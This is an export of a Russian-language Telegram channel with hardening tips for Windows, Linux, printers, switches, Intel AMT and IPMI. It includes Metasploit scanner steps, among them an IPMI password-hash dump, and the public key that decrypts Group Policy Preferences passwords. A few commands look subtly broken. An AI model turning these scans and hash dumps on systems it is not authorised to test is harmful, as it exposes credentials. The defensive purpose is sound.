Думаете настроили WSUS и все у вас нормально? Это ни черта не работает. Нигде.<br><br>Вот еще одна критическая уязвимость Windows, которая приводит к RCE, - MS15-034. Уязвимости подвержены Windows 7, Windows Server 2008 R2, Windows 8, Windows 8.1, Windows Server 2012, Windows Server 2012 R2.<br><br><strong>Как проверить:</strong><br><br><code>nmap -sS -p80,443 -sV -Pn -n --script http-vuln-cve2015-1635.nse &lt;IPs&gt;</code><br><br><strong>Как устранить:</strong><br><br>Для любой системы устанавливаем KB3042553.
       </div>

      </div>

     </div>

     <div class="message service" id="message-21">

      <div class="body details">
6 October 2017
      </div>

     </div>

     <div class="message default clearfix" id="message27">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="06.10.2017 11:32:25">
11:32
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Принтеры. Поставил и забыл. А если поломают?<br><br>Что хакер может получить с принтера?<br>  - Учетные данные подключения к LDAP или почте<br>  - Список почтовых адресов<br>  - Документы<br>  - Точку для распространения атаки<br><br>Поэтому на каждый принтер и МФУ надо поставить пароль. И не &quot;admin&quot; или &quot;printer&quot;.<br><br>Небольшая инвентаризация, чтобы найти все устройства:<br><br><code>nmap -p80,443,515,631,5353,9100 -Pn -n -sV &lt;IP addresses&gt;</code><br><br>Заходим на каждый принтер и ставим пароль администратора. Пусть одинаковый, но сложный и длинный, вам нечасто придется его вводить. Пароль можно сохранить в KeePass.
       </div>

      </div>

     </div>

     <div class="message service" id="message-22">

      <div class="body details">
9 October 2017
      </div>

     </div>

     <div class="message default clearfix" id="message28">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="09.10.2017 13:17:28">
13:17
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Один их популярных способов повышения привилегий в Linux - задания в кроне. Это возможно, если на кронтабы выставлены избыточные права. Хакер запускает крон от имени обычного пользователя, а выполняются задания с повышенными правами.<br><br><strong>Проверяем права на задания крона:</strong><br><br><code>ls -l /etc/crontab</code><br><code>ls -l /etc/cron.hourly</code><br><code>ls -l  /etc/cron.daily</code><br><code>ls -l /etc/cron.weekly</code><br><code>ls -l /etc/cron.monthly</code><br><code>ls -l /etc/cron.d</code><br><br>Права должны быть только у рута.<br><br><strong>Ставим годные права на задания крона:</strong><br><br><code>chown root:root /etc/crontab</code><br><code>chmod og-rwx /etc/crontab</code><br><code>chown root:root /etc/cron.hourly</code><br><code>chmod og-rwx /etc/cron.hourly</code><br><code>chown root:root /etc/cron.daily</code><br><code>chmod og-rwx /etc/cron.daily</code><br><code>chown root:root /etc/cron.weekly</code><br><code>chmod og-rwx /etc/cron.weekly</code><br><code>chown root:root /etc/cron.monthly</code><br><code>chmod og-rwx /etc/cron.monthly</code><br><code>chown root:root /etc/cron.d</code><br><code>chmod og-rwx /etc/cron.d</code>
       </div>

      </div>

     </div>

     <div class="message service" id="message-23">

      <div class="body details">
10 October 2017
      </div>

     </div>

     <div class="message default clearfix" id="message29">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="10.10.2017 12:49:46">
12:49
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Еще один способ повышения привилегий в системах Linux - через уязвимые суидные файлы. Эти файлы выполняются с правами владельца. А при наличии в них уязвимостей, хакер может внедрить произвольный код, выполняемый с повышенными правами.<br><br><strong>Ищем SUID/SGID файлы:</strong><br><br><code>df --local -P | awk {&quot;if (NR!=1) print \$6&quot;} | xargs -I &quot;{}&quot; find &quot;{}&quot; -xdev -type f -perm -4000 -print</code><br><code>df --local -P | awk {&quot;if (NR!=1) print \$6&quot;} | xargs -I &quot;{}&quot; find &quot;{}&quot; -xdev -type f -perm -2000 -print</code><br><br>Список нормальных SUID/SGID файлов приводится тут <a href="http://telegra.ph/Bazovye-SUIDSGID-fajly-10-09">http://telegra.ph/Bazovye-SUIDSGID-fajly-10-09</a>.<br><br>Если у вас нашлись какие-то другие файлы, то это могут быть: файлы дополнительного ПО (скорей всего, вы должны его знать), вредоносные или опасные файлы. Для выяснения требуется немного загуглить про каждый конкретный файл. Если вы не нашли, что этому файлу действительно нужны особые права исполнения и он входит в необходимое ПО, то лучше удалить его или забрать права:<br><br><code>chmod u-s &lt;file&gt;</code><br><code>chmod g-s &lt;file&gt;</code><br><br>Также есть много дефолтных SUID/SGID файлов, которые никогда не используются, но при выявлении уязвимостей в них, могут быть проэксплуатированы хакером. С них тоже стоит убрать привилегии (смотрите внимательно, возможно, вы используете некоторые из них!):<br><br><code>chmod u-s /usr/bin/suidperl /usr/bin/sperl5.6.1 /usr/bin/gpasswd /usr/bin/kon</code><br><code>chmod u-s /usr/bin/newvc /usr/bin/chfn /usr/bin/chsh /usr/bin/newgrp /usr/bin/lppasswd</code><br><code>chmod u-s /usr/bin/kcheckpass /usr/bin/ssh /usr/bin/rcp /usr/bin/rlogin /usr/bin/rsh /usr/bin/inndstart</code><br><code>chmod u-s /usr/bin/rnews /usr/bin/startinnfeed /usr/bin/nwsfind /usr/bin/uucp /usr/bin/cu</code><br><code>chmod u-s /usr/bin/uuname /usr/bin/uustat /usr/bin/uux</code><br><code>chmod u-s /usr/lib/mc/bin/cons.saver</code><br><code>chmod -R u-s /usr/lib/amanda/</code><br><code>chmod u-s /usr/sbin/ping6 /usr/sbin/traceroute6 /usr/sbin/sendmail.sendmail /usr/sbin/usernetctl</code><br><code>chmod u-s /usr/sbin/userhelper /usr/sbin/amcheck /usr/sbin/uucico /usr/sbin/uuxqt</code><br><code>chmod u-s /sbin/pwdb_chkpwd /sbin/unix_chkpwd /sbin/cardctl</code><br><code>chmod -R g-s /var/mailman/</code><br><code>chmod g-s /var/spool/slrnpull/out.going</code><br><code>chmod g-s /var/ftp/pub</code><br><code>chmod g-s /usr/bin/wall /usr/bin/write /usr/bin/kdesud /usr/bin/slrnpull /usr/bin/cu /usr/bin/uuname</code><br><code>chmod g-s /usr/sbin/utempter /usr/sbin/uucico /usr/sbin/uuxqt</code><br><code>chmod g-s /sbin/netreport</code>
       </div>

      </div>

     </div>

     <div class="message service" id="message-24">

      <div class="body details">
11 October 2017
      </div>

     </div>

     <div class="message default clearfix" id="message30">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="11.10.2017 11:49:43">
11:49
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Большинство клиентов, подключаясь к сети, мечтают найти DHCP-сервер и бегут спамить по всей сети с запросом к какому-нибудь такому. Не обязательно санкционированному, их может устроить любой. Злобный хакер тут же готов воспользоваться этим и предложить им свой маршрутизатор по умолчанию или DNS-сервер. Вуаля! Доступ к трафику клиента.<br><br>Защититься, к счастью, очень просто.<br><br>На броадкастный запрос клиента DHCP-сервер отвечает юникастом на его MAC с предложением настроек, потом еще один запрос от клиента, и еще одно подтверждение юникастом от DHCP. Так вот эти юникасты от сервера приходят (по-хорошему) на вполне конкретные порты свичей. Такие порты назначаются доверенными. Остальные порты назначаются недоверенными, и если аттакер захочет отправить туда DHCP-ответы, свич просто их отбросит. Кроме того, броадкасты клиентов будут распространяться только по доверенным портам.<br><br><strong>Включаем DHCP-snooping на свиче:</strong><br><br>Cisco: <code>SW(config)#ip dhcp snooping</code><br>ProCurve: <code>sw(config)# dhcp-snooping</code><br><br><strong>Перечисляем VLAN, в которых он будет работать:</strong><br><br>Cisco: <code>SW(config)#ip dhcp snooping vlan &lt;vlanID1&gt;</code><br>           <code>SW(config)#ip dhcp snooping vlan &lt;vlanID2&gt;</code><br>           <code>…</code><br>ProCurve: <code>sw(config)# dhcp-snooping vlan &lt;vlanID1&gt;</code><br>                  <code>sw(config)# dhcp-snooping vlan &lt;vlanID2&gt;</code><br>                  <code>…</code><br><br><strong>Указываем доверенные порты</strong> (остальные по умолчанию считаются недоверенными). Будьте внимательны со связками свичей, если DHCP-ответ придет на недоверенный порт, он дропнется и клиент не сможет получить настройки:<br><br>Cisco: <code>SW(config-if)#ip dhcp snooping trust</code><br>ProCurve: <code>sw(config)# dhcp-snooping trust &lt;interface_name&gt;</code><br><br>Готово!
       </div>

      </div>

     </div>

     <div class="message service" id="message-25">

      <div class="body details">
12 October 2017
      </div>

     </div>

     <div class="message default clearfix" id="message31">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="12.10.2017 10:52:06">
10:52
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
А теперь открою вам секрет. На самом деле мы настраивали DHCP-snooping для защиты от другой атаки. Самой неустраняемой (по статистике повторных пентестов) и предоставляющей хакеру кучу доступа к трафику - ARP Spoofing. Атака банальная, тулзы для нее по пальцам не пересчитать, а профит для хакера чертовски высок.<br><br>Свичи с настроенным DHCP-snooping автоматически начинают вести базы привязок IP к MACам. Это и используется для защиты. По этой таблице коммутатор проверяет соответствие IP и MAC в ARP-запросах и ответах, а если оно не выполняется, то отбрасывает пакет. Таким образом, никто не сможет притвориться, что айпишник дефолт гейвея (ну или любой другой) - это его самый. Функция называется DAI (Dynamic ARP Inspection).<br><br><strong>Включаем DAI:</strong><br><br>(Cisco): <code>switch(config)# ip arp inspection vlan &lt;vlanID&gt;</code><br>(ProCurve): <code>switch(config)# arp-protect</code><br>                     <code>switch(config)# arp-protect vlan &lt;vlanID&gt;</code><br><br>Всего то! Проблемы возникают, когда используются статические адреса. Но и это можно решить.<br><br><strong>Настраиваем DAI для статики:</strong><br><br>(Cisco): <code>switch(config)#arp access-list &lt;ACLname&gt;</code><br>              <code>switch(config-arp-nacl)permit ip host &lt;IP&gt; mac host &lt;aaaa:bbbb:cccc&gt;</code><br>              <code>switch(config)#ip arp filter inspection filter &lt;ACLname&gt; vlan &lt;vlanID&gt;</code><br>(ProCurve): <code>switch(config)# ip source-binding &lt;vlanID&gt; &lt;IP&gt; &lt;MAC&gt; &lt;port&gt;</code><br><br>Ну и чтобы порт сам поднимался после ошибки:<br><br>(Cisco): <code>errdisable recovery cause arp-inspection interval &lt;interval&gt;</code>
       </div>

      </div>

     </div>

     <div class="message service" id="message-26">

      <div class="body details">
13 October 2017
      </div>

     </div>

     <div class="message default clearfix" id="message32">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="13.10.2017 10:48:39">
10:48
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Ну и на пятницу, в продолжение темы сетей, одна лайтовая настройка, убивающая двух зайцев. <br><br>Заяц первый - DHCP starvation - исчерпание адресов в пуле DHCP. Итого клиенты не могут подключиться.<br><br>Второй - СAM-table overflow - переполнение CAM-таблицы коммутатора. Он от этого бесится и начинает спамить как хаб, отдавая хакеру чужие пакетики.<br><br>Обе проблемы решаются с помощью port-security, которая настраивается на портах доступа.<br><br><strong>Настраиваем:</strong><br><br>(Cisco): <code>switch(config-if)# switchport mode access</code><br>              <code>switch(config-if)# switchport port-security</code><br>              <code>switch(config-if)# switchport port-security maximum 3</code><br>              <code>switch(config-if)# switchport port-security mac-address sticky</code><br>(ProCurve): <code>switch(config)# port-security &lt;port-list&gt; learn-mode limited-continuous action send-disable address-limit 3</code><br><br>Для Cisco можно настроить автовключение порта после ошибки:<br><br><code>switch(config)# errdisable recovery cause psecure-violation interval &lt;interval&gt;</code>
       </div>

      </div>

     </div>

     <div class="message service" id="message-27">

      <div class="body details">
16 October 2017
      </div>

     </div>

     <div class="message default clearfix" id="message33">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="16.10.2017 13:40:21">
13:40
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Есть такая удобная функция, как установка локальных паролей через групповые предпочтения. И не все знают, в чем подвох. Но хакеры то знают… <br><br>Подвох в том, что в этим самых групповых предпочтениях пароль шифруется, но шифруется на общем, всем известном ключе, таком:4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b.<br><br>В итоге любой пароль из групповых предпочтений за мгновение ока расшифровывается. Так что стоит убрать их оттуда.<br><br><strong>Проверяем, есть ли пароли:</strong><br><br><code>findstr /S /I cpassword C:\Windows\SYSVOL\sysvol</code><br><br>Если есть - удаляем.
       </div>

      </div>

     </div>

     <div class="message service" id="message-28">

      <div class="body details">
17 October 2017
      </div>

     </div>

     <div class="message default clearfix" id="message34">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="17.10.2017 10:44:50">
10:44
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Вчера, как вы уже наверно знаете, тряхануло старый добрый надежный WPA2. <br><br>Теперь эффективные атаки могут быть проведены на хендшейки различных типов.  Основаны они на повторной передаче пакета, устанавливающего ключ шифрования сессии. После чего сбрасывается nonce и криптоматериал для шифрования используется повторно. Это позволяет расшифровать по меньшей мере часть пакетов, а в некоторых протоколах (TKIP, GCMP) - еще и внедрять пакеты.<br><br>Апогея атака достигает на wpa_supplicant 2.4 и 2.5 (Linux, Android), где после описанной манипуляции устанавливается нулевой ключ. Тут весь трафик просто оказывается голым и может подвергаться любым воздействиям со стороны хакера.<br><br>Апдейтить нужно, в первую очередь, клиентов. Во вторую - точки доступа.<br><br>Многие вендоры уже выпустили патчи, некоторые - еще нет. Список и ссылки на патчи тут <a href="http://telegra.ph/Patchi-ot-KRACK-na-utro-17102017-10-16">http://telegra.ph/Patchi-ot-KRACK-na-utro-17102017-10-16</a>.
       </div>

      </div>

     </div>

     <div class="message service" id="message-29">

      <div class="body details">
18 October 2017
      </div>

     </div>

     <div class="message default clearfix" id="message35">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="18.10.2017 10:45:50">
10:45
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Зачастила в последнее время уязвимость Intel AMT, CVE-2017-5689, опубликованная в мае этого года. Затронуты уязвимостью версии Intel Active Management Technology (AMT), Intel Standard Manageability (SM) и Intel Small Business Technology (SBT) в прошивках с 6.х до 11.6.<br><br>Intel AMT — это аппаратная технология, предоставляющая удалённый и внеполосный (по независимому вспомогательному каналу TCP/IP) доступ для управления настройками и безопасностью компьютера независимо от состояния питания (удалённое включение/выключение компьютера) и состояния ОС. SM и SBT примерно то же по функционалу, но в немного другой реализации.<br><br>Технология эти реализованы далеко не на всех чипсетах Intel. Для их работы требуется поддержка со стороны чипсета, процессора и BIOS.<br><br>Уязвимость позволяет полностью обойти аутентификацию простым обнулением параметра response в HTTP-аутентификации. После этого хакер может получить доступ к выключению, перезагрузке управляемой машины, загрузки с локального (на стороне хакера) образа, иногда (если функция настроена) - к консоли управляемой машины.<br><br>Intel AMT (и другие) предоставляет пользовательский интерфейс на порту 16992 без SSL/TLS или на порту 16993 с SSL/TLS, иногда на 623 (без SSL/TLS) или 624 (c SSL/TLS). Поэтому выявить их можно с помощью nmap:<br><br><code>nmap -sS -p16992,16993,623,624 -Pn -n -v &lt;IPs&gt;</code><br><br><strong>Проверить наличие уязвимости</strong> поможет модуль метасплойта в Kali:<br><br><code>msfconsole</code><br><code>use auxiliary/scanner/http/intel_amt_digest_bypass</code><br><code>set RHOSTS &lt;address_range&gt;</code><br><code>run</code><br><code>set RPORT 623</code><br><code>run</code><br><code>set SSL true</code><br><code>set RPORT 16993</code><br><code>run</code><br><code>set RPORT 624</code><br><code>run</code><br><br><strong>Устранение:</strong><br><br><strong>Вариант 1: обновить прошивку.</strong> В следующем сообщении картинка с перечнем пропатченных версий.<br><br><strong>Вариант 2: расконфигурировать AMT</strong> и те технологии, которые позволяют настроить его обратно. Для этого:<br><br>Для виндоус качаем тулзу тут <a href="https://downloadcenter.intel.com/ru/download/26755">https://downloadcenter.intel.com/ru/download/26755</a>. Устанавливаем на уязвимом компе и запускаем из консоли:<br><br><code>Intel-SA-00075-console.exe -Unprovision &lt;пароль&gt;</code><br><code>Intel-SA-00075-console.exe -DisableLMS</code><br><br>И, если мы точно не используем AMT или очень не хотим допустить локального повышения прав, отключаем CCM с риском невозможности его обратного включения:<br><br><code>Intel-SA-00075-console.exe -DisableCCM</code><br><br>Для линукс качаем тулзу отсюда <a href="https://github.com/intel/INTEL-SA-00075-Linux-Detection-And-Mitigation-Tools">https://github.com/intel/INTEL-SA-00075-Linux-Detection-And-Mitigation-Tools</a>. Запускаем:<br><br><code>make</code><br><code>ls /dev/mei*</code><br><code>sudo ./INTEL-SA-00075-Unprovisioning-Tool or sudo ./INTEL-SA-00075-Unprovisioning-Tool -d /dev/&lt;mei_device_name&gt;</code><br><br>P.S. Если вы оставили AMT живой, не забудьте сменить пароль по умолчанию ;)
       </div>

      </div>

     </div>

     <div class="message default clearfix joined" id="message36">

      <div class="body">

       <div class="pull_right date details" title="18.10.2017 10:46:20">
10:46
       </div>

       <div class="media_wrap clearfix">

        <a class="photo_wrap clearfix pull_left" href="photos/photo_1@18-10-2017_10-46-20.jpg">

         <img class="photo" src="photos/photo_1@18-10-2017_10-46-20_thumb.jpg" style="width: 187px; height: 260px"/>

        </a>

       </div>

      </div>

     </div>

     <div class="message service" id="message-30">

      <div class="body details">
19 October 2017
      </div>

     </div>

     <div class="message default clearfix" id="message37">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="19.10.2017 12:24:52">
12:24
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Раз уж мы начали про аппаратное управление, нельзя не вспомнить IPMI.<br><br>IPMI (Intelligent Platform Management Interface) — интеллектуальный интерфейс управления платформой, предназначенный для автономного мониторинга и управления функциями, встроенными непосредственно в аппаратное и микропрограммное обеспечения серверных платформ.<br><br>С IPMI есть две распространенные проблемы: cipher zero (на самом деле нулевой набор криптоалгоритмов) и особенности протокола аутентификации RAKP.<br><br>Cipher zero просто позволяет полностью обойти аутентификацию. Проблема касается поделок Supermicro BMC, Dell iDRAC и HP iLO.<br><br><strong>Ищем:</strong> (с помощью metasploit в Kali)<br><br><code>msfconsole</code><br><code>use auxiliary/scanner/ipmi/ipmi_cipher_zero</code><br><code>set RHOSTS &lt;network_range&gt;</code><br><code>run</code><br><br><strong>Если нашлось, отключаем cipher zero:</strong> (ipmitool скачайте)<br><br><code>modprobe ipmi_devintf</code><br><code>modprobe ipmi_si</code><br><code>ipmitool -H &lt;host&gt; -P &lt;password&gt; -U &lt;username&gt; lan set 1 cipher_privs XaaaXXaaaXXaaXX</code><br><br>Про вторую фишку напишу завтра.
       </div>

      </div>

     </div>

     <div class="message service" id="message-31">

      <div class="body details">
20 October 2017
      </div>

     </div>

     <div class="message default clearfix" id="message38">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="20.10.2017 11:30:00">
11:30
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Протокол аутентификации RAKP используется во всех IPMI версии 2.0 и уязвим в своей архитектуре. Посылаешь ему имя пользователя на аутентификацию, а он отдает хеш пароля. Давайте, брутьте! Проблема значительно усугубляется тем, что мало кто меняет дефолтные пароли.<br><br><strong>Ищем:</strong> (опять metasploit)<br><br><code>msfconsole</code><br><code>use auxiliary/scanner/ipmi/ipmi_dumphashes</code><br><code>set RHOSTS &lt;network_range&gt;</code><br><code>run</code><br><br>Получили какие-нибудь хеши?<br><br><strong>Исправляем:</strong><br><br><strong>Вариант 1.</strong> Ставим сложный пароль, вот прям реально сложный, и длиииинный, чтоб забыть про него и не менять каждые полгода.<br><br><code>modprobe ipmi_devintf</code><br><code>modprobe ipmi_si</code><br><code>ipmitool -I lanplus -H &lt;host&gt; -U &lt;username&gt; -P &lt;password&gt; user list</code><br><code>ipmitool user set password &lt;user_number&gt;</code><br><br><strong>Вариант 2.</strong> Отключаем вообще IPMI.<br><br>(Linux): <code>modprobe ipmi_devintf</code><br>              <code>modprobe ipmi_si</code><br>              <code>ipmitool lan set 2 access off</code><br><br>(Windows): ставим ipmiutil<br>                     <code>ipmiutil lan -d</code>
       </div>

      </div>

     </div>

     <div class="message service" id="message-32">

      <div class="body details">
23 October 2017
      </div>

     </div>

     <div class="message default clearfix" id="message39">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="23.10.2017 12:42:07">
12:42
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Самые защищенные сети - это, те, админы которых сидят на линуксе, а домена Active Directory вообще нет. Но и в линуксах бывают дыры. Например, атака &apos;overlayfs&apos; в двух реинкарнациях. Первая касается Ubuntu 12.04, 14.04, 14.10, 15.04 с ядром до 3.19.0-21.21 и основана на недостаточной проверке привилегий при создании файлов в случае использования файловой системы overlayfs. Вторая затрагивает ядра до 4.3.3 включительно на любых системах и является по сути неправильным объединением прав доступа к файлам в файловой системе overlayfs. Эксплойты имеются.<br><br><strong>Если вы оказались в группе риска, обновляем ядро:</strong><br><br>(Fedora, CentOS, RedHat): <code>yum update kernel</code><br><br>(Debian, Ubuntu): <code>uname -r</code><br>                                 <code>apt-cache search linux-image</code><br>                                 <code>sudo apt-get install linux-image-x.x.x-xx</code>
       </div>

      </div>

     </div>

     <div class="message service" id="message-33">

      <div class="body details">
24 October 2017
      </div>

     </div>

     <div class="message default clearfix" id="message40">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="24.10.2017 12:19:56">
12:19
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
А вообще, если так подумать, то в Linux Kernel постоянно что-то находят. Без малого 2000 уязвимостей накопилось. Все их, конечно, не перечислить. Но вот интересные из последних:<br><br>CVE-2017-1000251 - Переполнение стека в блютус, потенциально позволяет выполнение произвольного кода. Актуально для версий с 3.3-rc1 по 4.13.1 включительно. Есть публичный эксплойт для DoS.<br><br>CVE-2017-14497, CVE-2017-14489, CVE-2017-14340, CVE-2017-14106, CVE-2017-14051, CVE-2017-13686, CVE-2017-12168, CVE-2017-11600 - ряд DoS для версий до 4.13.2. Для некоторых есть публичный эксплойт.<br><br>CVE-2017-13715 - Потенциально выполнение произвольного кода через MPLS-пакет, обрабатываемый функцией __skb_flow_dissect из net/core/flow_dissector.c, а вообще DoS. Актуально для версий до 4.3.<br><br>CVE-2017-12762 - Переполнение буфера в /drivers/isdn/i4l/isdn_net.c. Работает для 3.18.х, 4.4.х, 4.9.х и 4.12.х.<br><br>CVE-2017-12146 - Локальное повышение привилегий через рейс кондишн между чтением и сохранением в drivers/base/platform.c. До версии 4.12.1.<br><br>CVE-2017-11473 - Локальное повышение привилегий через переполнение буфера mp_override_legacy_irq() функции из arch/x86/kernel/acpi/boot.c. До версии 4.12.2.<br><br>Ну и так далее…<br><br>В итоге, кажется, <strong>обновлять</strong> нынче надо до версии 4.13.2. Но лучше сразу до <strong>4.13.4</strong>, ибо есть еще пара уязвимостей с низким уровнем риска (так как мало чего можно получить) - утечка данных, эксплуатируемая локально.
       </div>

      </div>

     </div>

     <div class="message service" id="message-34">

      <div class="body details">
25 October 2017
      </div>

     </div>

     <div class="message default clearfix" id="message41">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="25.10.2017 11:01:54">
11:01
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Астрологи, как видите, объявили неделю линукса. Ядро мы обновили, <em>apt-get update &amp;&amp; apt-get upgrade</em> не затруднит сделать. Что осталось?<br><br>Если ваш PATH неправильно сформирован, атакующий может подсунуть свой троян в прописанную в нем папочку, чтобы вы его по ошибке запустили.<br><br>В переменной PATH не должно быть:<br>  - текущей директории<br>  - пустой директории<br>  - директорий, принадлежащих другим пользователям<br>  - директорий, в которые у есть права записи у посторонних<br><br>Посмотреть PATH:<br><br><code>printenv | grep PATH</code><br><br><strong>А вот этот скрипт проверит, нет ли в нем упомянутых выше недочетов:</strong><br><br><code>if [ &quot;`</code> <code>/bin/echo $PATH | /bin/grep :: </code> <code>`&quot; != &quot;&quot; ]; then /bin/echo &quot;Empty Directory in PATH (::)&quot;; fi;</code><br><code>if [ &quot;`</code> <code>/bin/echo $PATH | /bin/grep :$</code> <code>`&quot; != &quot;&quot; ]; then /bin/echo &quot;Trailing : in PATH&quot;; fi;</code><br><code>p=`</code> <code>/bin/echo $PATH | /bin/sed -e &quot;s/::/:/&quot; -e &quot;s/:\$//&quot; -e &quot;s/:/ /g&quot;</code> <code>`;</code><br><code>set -- $p;</code><br><code>while [ &quot;$1&quot; != &quot;&quot; ]; do /bin/echo $1; if [ &quot;$1&quot; == &quot;.&quot; ]; then /bin/echo &quot;PATH contains .&quot;; shift; continue; fi; if [ -d $1 ]; then dirperm=`</code> <code>/bin/ls -ldH $1 | /usr/bin/cut -f1 -d&quot; &quot;</code> <code>`; /bin/echo &quot;$dirperm&quot;; if [ `</code> <code>/bin/echo $dirperm | /usr/bin/cut -c6 </code> <code>` != &quot;-&quot; ]; then /bin/echo &quot;Group Write permissions on directory $1&quot;; fi; if [ `</code> <code>/bin/echo $dirperm | /usr/bin/cut -c9 </code> <code>` != &quot;-&quot; ]; then /bin/echo &quot;Other Write permissions set on directory $1&quot;; fi; dirown=`</code> <code>/bin/ls -ldH $1 | /usr/bin/awk &quot;{print \&quot;\$3\&quot;}&quot;</code> <code>`; /bin/echo &quot;$dirown&quot;; if [ &quot;$dirown&quot; != &quot;root&quot; ]; then /bin/echo &quot;$1 is not owned by root&quot;; fi; else /bin/echo &quot;$1 is not a directory&quot;; fi; shift; done</code><br><br>Скрипт про рута, но можно подставить вместо root любое имя пользователя.<br><br>Если нашлись проблемы, предстоит долгое выяснение, откуда они взялись. <strong>Ну а исправить PATH можно так</strong>:<br><br><code>PATH=echo $PATH | sed -e &apos;s/::/:/g; s/:.:/:/g; s/:.$//; s/^://; s/:$//; s/:&lt;лишние_директории&gt;//&apos;</code><br><br>Заодно дописать эту строку в .bashrc или .profile для профилактики.
       </div>

      </div>

     </div>

     <div class="message service" id="message-35">

      <div class="body details">
26 October 2017
      </div>

     </div>

     <div class="message default clearfix" id="message42">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="26.10.2017 11:09:01">
11:09
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
Файлы /etc/hosts.equiv и .rhosts содержат списки доверенных хостов для подключения к серверу rshd.<br><br>Файл .forward содержит списки переадресации для почты пользователя.<br><br>Файл .netrc содержит креды для автоматического логина по rexec и ftp.<br><br>Папка .ssh содержит ключи для подключения по ssh.<br><br>В общем, полезные вещи для хакера.<br><br><strong>/etc/hosts.equiv, .rhosts и .netrc нужно вообще удалить, если они есть:</strong><br><br><code>rm /etc/hosts.equiv</code><br><code>rm /home/*/.rhosts /root/.rhosts</code><br><code>rm /home/*/.netrc /root/.netrc</code><br><br><strong>На .forward и .ssh должны быть строгие права:</strong><br><br><code>ls -la /home/*/.forward /root/.forward</code><br><code>chown &lt;user&gt;:&lt;user&gt; /home/&lt;user&gt;/.forward</code><br><code>chmod 600 /home/*/.forward</code><br><code>chown -R &lt;user&gt;:&lt;user&gt; /home/&lt;user&gt;/.ssh</code><br><code>chmod -R 600 /home/*/.ssh</code>
       </div>

      </div>

     </div>

     <div class="message service" id="message-36">

      <div class="body details">
27 October 2017
      </div>

     </div>

     <div class="message default clearfix" id="message43">

      <div class="pull_left userpic_wrap">

       <div class="userpic userpic7" style="width: 42px; height: 42px">

        <div class="initials" style="line-height: 42px">
I
        </div>

       </div>

      </div>

      <div class="body">

       <div class="pull_right date details" title="27.10.2017 12:12:18">
12:12
       </div>

       <div class="from_name">
Information Hardening 
       </div>

       <div class="text">
